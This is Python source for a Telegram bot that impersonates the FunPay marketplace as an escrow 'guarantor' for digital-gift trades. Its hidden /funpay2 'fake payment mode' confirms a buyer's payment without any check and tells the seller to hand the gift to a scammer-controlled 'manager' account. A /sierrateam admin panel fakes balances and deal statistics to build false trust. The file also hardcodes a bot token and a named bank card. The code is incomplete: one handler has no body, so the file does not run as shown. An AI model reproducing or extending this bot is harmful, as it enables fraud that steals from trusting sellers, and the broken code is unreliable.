import asyncio
import random
import string
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command, CommandStart
from aiogram.enums import ParseMode

# Обновленные данные
bot = Bot(token="8531227508:AAH0hraNjR-yS7_NHj4T29osDXgiqshYO38")
dp = Dispatcher()

# Хранение данных
user_agreements = {}
user_languages = {}
user_balances = {}
user_deals = {}
user_requisites = {}
active_deals = {}
user_stats = {}
deal_counter = 0
MANAGER_CARD = "2204 1201 3279 4013 - Маркин Ярослав"
BANNER_URL = "https://s4.iimage.su/s/08/ge2Mdk3xsEJWX46gzz9mR2PtIurOfg5mz6VqTiJ1.jpg"
SUPPORT_USERNAME = "@FunPaySupportOTC"

banned_users = set()
admin_states = {}
fake_mode_users = set()  # Для фейк-режима

# Генерация случайных значений
def generate_memo():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))

def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

# Русские клавиатуры
start_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Полностью согласен", callback_data="agree")]
])

welcome_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Продолжить", callback_data="continue")]
])

main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Создать сделку", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Реквизиты", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Сменить язык", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Поддержка", url=f"https://t.me/FunPayOTCdbot")],
    [InlineKeyboardButton(text="Наш сайт", url="https://funpay.com/")]
])

deal_type_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Подарок", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 В меню", callback_data="back_to_menu")]
])

back_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

currency_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇺🇿 UZS", callback_data="currency_UZS"), InlineKeyboardButton(text="🇰🇬 KGS", callback_data="currency_KGS")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Stars", callback_data="currency_STARS")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

cancel_confirm_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да, отменить", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ Нет", callback_data="back_to_deal")]
])

profile_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Пополнить баланс", callback_data="deposit"), InlineKeyboardButton(text="💸 Вывод средств", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

read_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я прочитал(-а)", callback_data="read_deposit")]
])

deposit_method_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Банковская карта", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

back_simple_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_requisites")]
])

requisites_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Добавить карту", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Добавить TON кошелек", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 Посмотреть реквизиты", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

language_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru"), InlineKeyboardButton(text="🇺🇸 English", callback_data="lang_en")],
    [InlineKeyboardButton(text="🔙 Обратно в меню", callback_data="back_to_menu")]
])

# Английские клавиатуры
start_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I fully agree", callback_data="agree")]
])

welcome_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Continue", callback_data="continue")]
])

main_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Create deal", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Profile", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Payment details", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Change language", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Support", url=f"https://t.me/FunPaySupportOTC")],
    [InlineKeyboardButton(text="Our website", url="https://funpay.com/")]
])

deal_type_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Gift", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 To menu", callback_data="back_to_menu")]
])

back_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

currency_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇺🇿 UZS", callback_data="currency_UZS"), InlineKeyboardButton(text="🇰🇬 KGS", callback_data="currency_KGS")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Stars", callback_data="currency_STARS")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

cancel_confirm_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Yes, cancel", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ No", callback_data="back_to_deal")]
])

profile_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Deposit", callback_data="deposit"), InlineKeyboardButton(text="💸 Withdraw", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

read_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I have read", callback_data="read_deposit")]
])

deposit_method_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Bank card", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

back_simple_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_requisites")]
])

requisites_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Add card", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Add TON wallet", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 View requisites", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

# Клавиатуры для сделок
buyer_deal_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я оплатил", callback_data="paid_confirmed")],
    [InlineKeyboardButton(text="❌ Выйти из сделки", callback_data="exit_deal")]
])

admin_payment_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Оплата получена", callback_data="admin_payment_ok")],
    [InlineKeyboardButton(text="❌ Оплата не получена", callback_data="admin_payment_fail")]
])

seller_gift_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Item sent", callback_data="item_sent")]
])

buyer_confirmation_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да, все верно", callback_data="buyer_confirm_ok")],
    [InlineKeyboardButton(text="❌ Нет, товар не получен", callback_data="buyer_confirm_fail")]
])

sierrateam_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Я ознакомился", callback_data="sierrateam_read")]
])

admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="⛔️ Забанить пользователя", callback_data="ban_user")],
    [InlineKeyboardButton(text="💸 Отправить деньги", callback_data="send_money")],
    [InlineKeyboardButton(text="✅ Установить успешные сделки", callback_data="set_successful_deals")],
    [InlineKeyboardButton(text="📊 Установить общее кол-во сделок", callback_data="set_total_deals")],
    [InlineKeyboardButton(text="💰 Установить оборот", callback_data="set_turnover")],
    [InlineKeyboardButton(text="🔙 Главное меню", callback_data="back_to_menu")]
])

# Утилиты
async def send_main_menu(chat_id, lang='ru', message_id=None):
    keyboard = main_keyboard_ru if lang == "ru" else main_keyboard_en
    
    text = (
        "🎁 <b>FunPay OTC | Безопасные сделки</b>\n\n"
        "Надежный сервис для покупки и продажи цифровых подарков!\n\n"
        "✨ <b>Наши преимущества:</b>\n"
        "• Гарант безопасности сделок\n"
        "• Быстрые переводы в любой валюте\n"
        "• Поддержка 24/7\n"
        "• Простой и удобный интерфейс\n\n"
        "Выберите нужный раздел ниже:"
    ) if lang == "ru" else (
        "🎁 <b>FunPay OTC | Secure Deals</b>\n\n"
        "Reliable service for buying and selling digital gifts!\n\n"
        "✨ <b>Our advantages:</b>\n"
        "• Deal security guarantee\n"
        "• Fast transfers in any currency\n"
        "• 24/7 support\n"
        "• Simple and user-friendly interface\n\n"
        "Choose the desired section below:"
    )
    
    if message_id:
        try:
            await bot.edit_message_text(text, chat_id, message_id, reply_markup=keyboard, parse_mode=ParseMode.HTML)
        except:
            await bot.send_message(chat_id, text, reply_markup=keyboard, parse_mode=ParseMode.HTML)
    else:
        await bot.send_message(chat_id, text, reply_markup=keyboard, parse_mode=ParseMode.HTML)

async def safe_edit_message(callback, text, keyboard=None):
    try:
        await callback.message.edit_text(text, reply_markup=keyboard, parse_mode=ParseMode.HTML)
    except:
        await callback.message.answer(text, reply_markup=keyboard, parse_mode=ParseMode.HTML)

# Команда /start
@dp.message(CommandStart())
async def start_command(message: Message):
    user_id = message.from_user.id
    lang = user_languages.get(user_id, "ru")
    if user_id not in user_agreements:
        keyboard = start_keyboard_ru if lang == "ru" else start_keyboard_en
        text = (
            "📜 <b>Правила использования</b>\n\n"
            "1. Все сделки проводятся через гаранта.\n"
            "2. Запрещено мошенничество.\n"
            "3. Соблюдайте вежливость.\n\n"
            "Согласны?"
        ) if lang == "ru" else (
            "📜 <b>Terms of Use</b>\n\n"
            "1. All deals through guarantor.\n"
            "2. No fraud allowed.\n"
            "3. Be polite.\n\n"
            "Agree?"
        )
        await message.answer(text, reply_markup=keyboard, parse_mode=ParseMode.HTML)
    else:
        await send_main_menu(user_id, lang)

# Callback для agree
@dp.callback_query(F.data == "agree")
async def agree_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    user_agreements[user_id] = True
    keyboard = welcome_keyboard_ru if lang == "ru" else welcome_keyboard_en
    text = "Добро пожаловать!" if lang == "ru" else "Welcome!"
    await safe_edit_message(callback, text, keyboard)

# Callback для continue
@dp.callback_query(F.data == "continue")
async def continue_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    await send_main_menu(user_id, lang, callback.message.message_id)

# Callback для create_deal
@dp.callback_query(F.data == "create_deal")
async def create_deal_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    keyboard = deal_type_keyboard_ru if lang == "ru" else deal_type_keyboard_en
    text = "Выберите тип сделки:" if lang == "ru" else "Choose deal type:"
    await safe_edit_message(callback, text, keyboard)

# Callback для deal_gift
@dp.callback_query(F.data == "deal_gift")
async def deal_gift_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    keyboard = currency_keyboard_ru if lang == "ru" else currency_keyboard_en
    text = "Выберите валюту:" if lang == "ru" else "Choose currency:"
    await safe_edit_message(callback, text, keyboard)

# Callback для currency_*
@dp.callback_query(F.data.startswith("currency_"))
async def currency_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    currency = callback.data.split("_")[1]
    lang = user_languages.get(user_id, "ru")
    user_deals[user_id] = {"step": "amount", "currency": currency}
    text = "Введите сумму:" if lang == "ru" else "Enter amount:"
    await safe_edit_message(callback, text)

# Callback для back_step
@dp.callback_query(F.data == "back_step")
async def back_step_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    # Возврат к предыдущему шагу, например к типу сделки
    keyboard = deal_type_keyboard_ru if lang == "ru" else deal_type_keyboard_en
    text = "Выберите тип сделки:" if lang == "ru" else "Choose deal type:"
    await safe_edit_message(callback, text, keyboard)

# Callback для back_to_menu
@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    await send_main_menu(user_id, lang, callback.message.message_id)

# Callback для profile
@dp.callback_query(F.data == "profile")
async def profile_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    keyboard = profile_keyboard_ru if lang == "ru" else profile_keyboard_en
    stats = user_stats.get(user_id, {"successful": 0, "total": 0, "turnover": 0})
    balance = user_balances.get(user_id, 0)
    text = (
        f"👤 <b>Профиль</b>\n\n"
        f"Баланс: {balance}\n"
        f"Успешные сделки: {stats['successful']}\n"
        f"Общее кол-во: {stats['total']}\n"
        f"Оборот: {stats['turnover']}"
    ) if lang == "ru" else (
        f"👤 <b>Profile</b>\n\n"
        f"Balance: {balance}\n"
        f"Successful deals: {stats['successful']}\n"
        f"Total deals: {stats['total']}\n"
        f"Turnover: {stats['turnover']}"
    )
    await safe_edit_message(callback, text, keyboard)

# Callback для deposit
@dp.callback_query(F.data == "deposit")
async def deposit_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    keyboard = read_keyboard_ru if lang == "ru" else read_keyboard_en
    text = (
        "ℹ️ <b>Информация о пополнении</b>\n\n"
        "Пополните баланс через менеджер."
    ) if lang == "ru" else (
        "ℹ️ <b>Deposit Information</b>\n\n"
        "Top up balance via manager."
    )
    await safe_edit_message(callback, text, keyboard)

# Callback для read_deposit
@dp.callback_query(F.data == "read_deposit")
async def read_deposit_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    keyboard = deposit_method_keyboard_ru if lang == "ru" else deposit_method_keyboard_en
    text = "Выберите метод пополнения:" if lang == "ru" else "Choose deposit method:"
    await safe_edit_message(callback, text, keyboard)

# Callback для deposit_card
@dp.callback_query(F.data == "deposit_card")
async def deposit_card_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    text = f"Карта менеджера: {MANAGER_CARD}" if lang == "ru" else f"Manager card: {MANAGER_CARD}"
    keyboard = back_keyboard_ru if lang == "ru" else back_keyboard_en
    await safe_edit_message(callback, text, keyboard)

# Callback для deposit_ton
@dp.callback_query(F.data == "deposit_ton")
async def deposit_ton_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    text = "TON кошелек менеджера: [wallet]" if lang == "ru" else "Manager TON wallet: [wallet]"
    keyboard = back_keyboard_ru if lang == "ru" else back_keyboard_en
    await safe_edit_message(callback, text, keyboard)

# Callback для withdraw
@dp.callback_query(F.data == "withdraw")
async def withdraw_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    text = "Введите сумму для вывода:" if lang == "ru" else "Enter withdrawal amount:"
    # Здесь можно установить состояние для вывода
    await safe_edit_message(callback, text)

# Callback для requisites
@dp.callback_query(F.data == "requisites")
async def requisites_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    keyboard = requisites_keyboard_ru if lang == "ru" else requisites_keyboard_en
    text = "Управление реквизитами:" if lang == "ru" else "Manage requisites:"
    await safe_edit_message(callback, text, keyboard)

# Callback для add_card
@dp.callback_query(F.data == "add_card")
async def add_card_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    text = "Введите номер карты в формате XXXX XXXX XXXX XXXX - Имя" if lang == "ru" else "Enter card number in format XXXX XXXX XXXX XXXX - Name"
    await safe_edit_message(callback, text)

# Callback для add_ton
@dp.callback_query(F.data == "add_ton")
async def add_ton_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    text = "Введите адрес TON кошелька:" if lang == "ru" else "Enter TON wallet address:"
    await safe_edit_message(callback, text)

# Callback для view_requisites
@dp.callback_query(F.data == "view_requisites")
async def view_requisites_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    req = user_requisites.get(user_id, {})
    card = req.get("card", "Не добавлено")
    ton = req.get("ton", "Не добавлено")
    text = f"Карта: {card}\nTON: {ton}" if lang == "ru" else f"Card: {card}\nTON: {ton}"
    keyboard = back_simple_keyboard_ru if lang == "ru" else back_simple_keyboard_en
    await safe_edit_message(callback, text, keyboard)

# Callback для back_to_requisites
@dp.callback_query(F.data == "back_to_requisites")
async def back_to_requisites_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    keyboard = requisites_keyboard_ru if lang == "ru" else requisites_keyboard_en
    text = "Управление реквизитами:" if lang == "ru" else "Manage requisites:"
    await safe_edit_message(callback, text, keyboard)

# Callback для change_language
@dp.callback_query(F.data == "change_language")
async def change_language_callback(callback: CallbackQuery):
    await safe_edit_message(callback, "Choose language:", language_keyboard)

# Callback для lang_ru
@dp.callback_query(F.data == "lang_ru")
async def lang_ru_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    user_languages[user_id] = "ru"
    await send_main_menu(user_id, "ru", callback.message.message_id)

# Callback для lang_en
@dp.callback_query(F.data == "lang_en")
async def lang_en_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    user_languages[user_id] = "en"
    await send_main_menu(user_id, "en", callback.message.message_id)

# Команда /funpay2
@dp.message(Command("funpay2"))
async def funpay2_command(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте за нарушением правил, пункт 3.1")
        return
    fake_mode_users.add(user_id)
    await message.answer("✅ Фейк-режим оплаты включен.")

# Команда /sierrateam
@dp.message(Command("sierrateam"))
async def sierrateam_command(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте за нарушением правил, пункт 3.1")
        return
    await message.answer("Админ панель правила:", reply_markup=sierrateam_keyboard)

# Callback для sierrateam_read
@dp.callback_query(F.data == "sierrateam_read")
async def sierrateam_read_callback(callback: CallbackQuery):
    await safe_edit_message(callback, "Админ панель:", admin_keyboard)

# Админ callbacks
@dp.callback_query(F.data == "ban_user")
async def ban_user_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_ban_id"
    await safe_edit_message(callback, "Введите ID для бана:")

@dp.callback_query(F.data == "send_money")
async def send_money_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_send_money"
    await safe_edit_message(callback, "Введите ID сумма:")

@dp.callback_query(F.data == "set_successful_deals")
async def set_successful_deals_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_successful_deals"
    await safe_edit_message(callback, "Введите ID количество:")

@dp.callback_query(F.data == "set_total_deals")
async def set_total_deals_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_total_deals"
    await safe_edit_message(callback, "Введите ID количество:")

@dp.callback_query(F.data == "set_turnover")
async def set_turnover_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_turnover"
    await safe_edit_message(callback, "Введите ID сумма:")

# Callback для сделок (остальные как в оригинале)
@dp.callback_query(F.data == "paid_confirmed")
async def paid_confirmed_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("buyer_id") == user_id and deal["status"] == "active":
            if user_id in fake_mode_users:
                deal["status"] = "payment_confirmed"
                seller_lang = user_languages.get(deal["seller_id"], "ru")
                text_seller = (
                    f"✅ <b>Оплата подтверждена!</b>\n\n"
                    f"🆔 <b>ID сделки:</b> #{deal_id}\n"
                    f"💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}\n\n"
                    f"📝 <b>Описание:</b>\n{deal['description']}\n\n"
                    f"⚠️ <b>ВАЖНО:</b> Отправьте подарок менеджеру @FunPaySupportOTC\n\n"
                    f"После отправки нажмите кнопку ниже:"
                ) if seller_lang == "ru" else (
                    f"✅ <b>Payment confirmed!</b>\n\n"
                    f"🆔 <b>Deal ID:</b> #{deal_id}\n"
                    f"💰 <b>Amount:</b> {deal['amount']} {deal['currency']}\n\n"
                    f"📝 <b>Description:</b>\n{deal['description']}\n\n"
                    f"⚠️ <b>IMPORTANT:</b> Send gift to manager @FunPaySupportOTC\n\n"
                    f"After sending click button below:"
                )
                await bot.send_message(deal["seller_id"], text_seller, reply_markup=seller_gift_keyboard, parse_mode=ParseMode.HTML)
                
                await callback.message.edit_text(
                    "✅ <b>Оплата подтверждена!</b>\n\n"
                    "Ожидаем отправки товара от продавца...\n"
                    "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                    parse_mode=ParseMode.HTML
                )
            else:
                deal["status"] = "waiting_admin"
                await callback.message.edit_text(
                    "✅ <b>Оплата подтверждена!</b>\n\n"
                    "Ожидаем проверки администратора...\n"
                    "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                    parse_mode=ParseMode.HTML
                )
                
                text_admin = (
                    f"🧾 <b>Покупатель подтвердил оплату</b>\n\n"
                    f"🆔 <b>ID сделки:</b> #{deal_id}\n"
                    f"💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}\n"
                    f"👤 <b>Продавец:</b> @{deal['seller_username']}\n"
                    f"🛒 <b>Покупатель:</b> @{deal['buyer_username']}\n\n"
                    f"📞 <b>Поддержка:</b> @FunPaySupportOTC"
                )
                await bot.send_message(user_id, text_admin, reply_markup=admin_payment_keyboard, parse_mode=ParseMode.HTML)  # Отправляем админу или себе
                active_deals[deal_id]["admin_message_id"] = callback.message.message_id
            break

@dp.callback_query(F.data == "exit_deal")
async def exit_deal_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    text = "Вы вышли из сделки." if lang == "ru" else "You exited the deal."
    await safe_edit_message(callback, text)
    # Здесь можно удалить сделку если нужно

@dp.callback_query(F.data == "admin_payment_fail")
async def admin_payment_fail_callback(callback: CallbackQuery):
    text = "Оплата не подтверждена."
    await safe_edit_message(callback, text)
    # Дополнительная логика

# Другие callbacks из оригинала...

@dp.message(F.text)
async def message_handler(message: Message):
    # Как в оригинале...

async def main():
    print("🎁 FunPay Bot запускается...")
    print(f"📞 Поддержка: {SUPPORT_USERNAME}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())